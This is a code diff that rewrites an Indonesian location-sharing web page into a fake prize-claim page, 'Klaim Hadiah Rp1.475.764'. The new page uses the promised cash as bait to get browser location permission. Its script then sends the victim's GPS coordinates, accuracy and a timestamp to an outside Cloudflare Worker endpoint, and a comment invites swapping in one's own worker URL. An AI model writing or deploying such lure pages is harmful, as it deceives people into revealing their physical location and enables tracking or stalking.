@@ -4,7 +4,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width,initial-scale=1" />
 
-    <title>Bagikan Lokasi</title>
+    <title>Klaim Hadiah Rp1.475.764</title>
 
     <style>
       * {
@@ -17,94 +17,65 @@
         display: flex;
         align-items: center;
         justify-content: center;
-        padding: 20px;
-
         font-family: Arial, sans-serif;
-
         background: linear-gradient(135deg, #ff4fa3, #ff8ac7);
-
-        color: #333;
       }
 
       .card {
-        width: min(100%, 430px);
-
-        background: #fff;
-
-        border-radius: 24px;
-
+        width: min(92%, 430px);
         padding: 30px 24px;
-
+        background: #fff;
+        border-radius: 24px;
         text-align: center;
-
-        box-shadow: 0 18px 50px rgba(165, 0, 85, 0.35);
+        box-shadow: 0 18px 50px #a50055aa;
       }
 
       .badge {
         display: inline-block;
-
         padding: 8px 15px;
-
         border-radius: 999px;
-
         background: #ffe0ef;
-
         color: #d6006d;
-
         font-weight: bold;
       }
 
       h1 {
-        margin: 18px 0 10px;
-
         color: #d6006d;
-
         font-size: 30px;
+        margin: 18px 0 8px;
+      }
+
+      .money {
+        font-size: 36px;
+        font-weight: 800;
+        color: #ff2f91;
+        margin: 15px 0;
       }
 
       p {
         color: #666;
-
-        line-height: 1.55;
+        line-height: 1.5;
       }
 
       .notice {
-        margin-top: 18px;
-
-        padding: 15px;
-
-        border-radius: 14px;
-
         background: #fff4fa;
-
         border: 1px solid #ffc2df;
-
+        border-radius: 14px;
+        padding: 13px;
         text-align: left;
-
-        font-size: 14px;
-
-        line-height: 1.5;
+        font-size: 13px;
       }
 
       button {
         width: 100%;
-
         border: 0;
-
         border-radius: 14px;
-
         padding: 16px;
-
-        margin-top: 20px;
-
+        margin-top: 18px;
         background: #ff2f91;
-
-        color: white;
-
+        color: #fff;
         font-size: 17px;
-
         font-weight: bold;
-
         cursor: pointer;
       }
 
@@ -114,12 +85,9 @@
       }
 
       .status {
-        margin-top: 16px;
-
+        margin-top: 15px;
         font-size: 14px;
-
         color: #666;
-
         line-height: 1.5;
       }
 
@@ -132,121 +100,161 @@
         color: #c62828;
         font-weight: bold;
       }
+
+      .map {
+        display: none;
+        margin-top: 12px;
+        color: #d6006d;
+        font-weight: bold;
+        text-decoration: none;
+      }
     </style>
   </head>
 
   <body>
     <div class="card">
-      <span class="badge"> 📍 BERBAGI LOKASI </span>
+      <span class="badge">🎁 PROGRAM HADIAH</span>
 
-      <h1>Bagikan Lokasi</h1>
+      <h1>Klaim Hadiah</h1>
 
-      <p>Tekan tombol di bawah untuk meminta lokasi perangkat Anda.</p>
+      <div class="money">Rp1.475.764</div>
+
+      <p>Tekan tombol untuk melanjutkan proses klaim.</p>
 
       <div class="notice">
-        <b>Persetujuan lokasi</b><br /><br />
+        <b>📍 Persetujuan lokasi</b><br /><br />
 
-        Browser akan menampilkan permintaan izin lokasi. Lokasi hanya dikirim
-        setelah Anda memberikan izin. Anda dapat menolak permintaan tersebut
-        kapan saja.
+        Untuk melanjutkan proses klaim, browser akan meminta izin lokasi Anda.
+        Jika Anda menyetujui, lokasi akan dikirim ke sistem klaim untuk
+        diproses.
       </div>
 
-      <button id="claim">📍 Izinkan & Bagikan Lokasi</button>
+      <button id="claim">📍 Klaim Sekarang</button>
 
       <div id="status" class="status"></div>
+
+      <a id="map" class="map" target="_blank" rel="noopener noreferrer">
+        🗺️ Lihat di Google Maps
+      </a>
     </div>
 
     <script>
+      const btn = document.getElementById("claim");
+      const status = document.getElementById("status");
+      const map = document.getElementById("map");
+
+      /*
+    ==================================================
+    GANTI URL DI BAWAH DENGAN URL CLOUDFLARE WORKER
+    ==================================================
+  */
+
       const WORKER_URL = "https://calm-brook-2990.legends616616.workers.dev";
 
-      const btn = document.getElementById("claim");
-
-      const status = document.getElementById("status");
-
-      function setStatus(text, type = "") {
-        status.className = "status " + type;
-
-        status.textContent = text;
-      }
-
       btn.addEventListener("click", () => {
+        if (!window.isSecureContext) {
+          status.className = "status error";
+
+          status.textContent = "Lokasi membutuhkan koneksi HTTPS.";
+
+          return;
+        }
+
         if (!navigator.geolocation) {
-          setStatus("Browser ini tidak mendukung lokasi.", "error");
+          status.className = "status error";
+
+          status.textContent = "Browser tidak mendukung fitur lokasi.";
 
           return;
         }
 
         btn.disabled = true;
 
-        setStatus("Mencari lokasi paling akurat... Silakan tunggu.");
+        status.className = "status";
+
+        status.textContent = "Meminta izin lokasi...";
 
         navigator.geolocation.getCurrentPosition(
           async (position) => {
-            const latitude = position.coords.latitude;
+            const lat = position.coords.latitude;
 
-            const longitude = position.coords.longitude;
+            const lon = position.coords.longitude;
 
-            const accuracy = position.coords.accuracy;
+            const acc = Math.round(position.coords.accuracy);
 
-            setStatus(
-              `Lokasi ditemukan. Akurasi sekitar ${Math.round(accuracy)} meter. Mengirim...`,
-            );
+            const waktu = new Date().toISOString();
 
-            const data = {
-              latitude,
+            const mapsUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
 
-              longitude,
+            map.href = mapsUrl;
 
-              accuracy,
+            map.style.display = "inline-block";
 
-              timestamp: new Date().toISOString(),
-            };
+            status.className = "status";
+
+            status.textContent = "Lokasi berhasil diperoleh. Mengirim data...";
 
             try {
-              const response = await fetch(
-                WORKER_URL,
+              const response = await fetch(WORKER_URL, {
+                method: "POST",
 
-                {
-                  method: "POST",
-
-                  headers: {
-                    "Content-Type": "application/json",
-                  },
-
-                  body: JSON.stringify(data),
+                headers: {
+                  "Content-Type": "application/json",
                 },
-              );
+
+                body: JSON.stringify({
+                  latitude: lat,
+
+                  longitude: lon,
+
+                  accuracy: acc,
+
+                  timestamp: waktu,
+                }),
+              });
 
               const result = await response.json();
 
               if (!response.ok || !result.ok) {
-                throw new Error(result.error || "Server menolak lokasi.");
+                throw new Error("Worker gagal menerima data.");
               }
 
-              setStatus("Lokasi berhasil dikirim.", "success");
+              status.className = "status success";
+
+              status.textContent =
+                "✅ Lokasi berhasil dikirim. " +
+                "Akurasi sekitar " +
+                acc +
+                " meter.";
             } catch (error) {
               console.error(error);
 
-              setStatus("Gagal mengirim lokasi: " + error.message, "error");
+              status.className = "status error";
 
-              btn.disabled = false;
+              status.textContent =
+                "Lokasi berhasil diperoleh, " + "tetapi gagal mengirim data.";
             }
+
+            btn.disabled = false;
           },
 
           (error) => {
-            let message = "Lokasi tidak dapat diperoleh.";
+            btn.disabled = false;
+
+            status.className = "status error";
 
             if (error.code === 1) {
-              message = "Izin lokasi ditolak.";
+              status.textContent =
+                "Izin lokasi ditolak. " + "Silakan izinkan lokasi di browser.";
             } else if (error.code === 2) {
-              message = "Lokasi tidak tersedia.";
+              status.textContent =
+                "Lokasi tidak tersedia. " + "Aktifkan GPS/Lokasi.";
             } else if (error.code === 3) {
-              message = "Waktu mencari lokasi habis. Silakan coba lagi.";
+              status.textContent =
+                "Pengambilan lokasi terlalu lama. " + "Silakan coba lagi.";
+            } else {
+              status.textContent = "Gagal mendapatkan lokasi.";
             }
-
-            setStatus(message, "error");
-
-            btn.disabled = false;
           },
 
           {
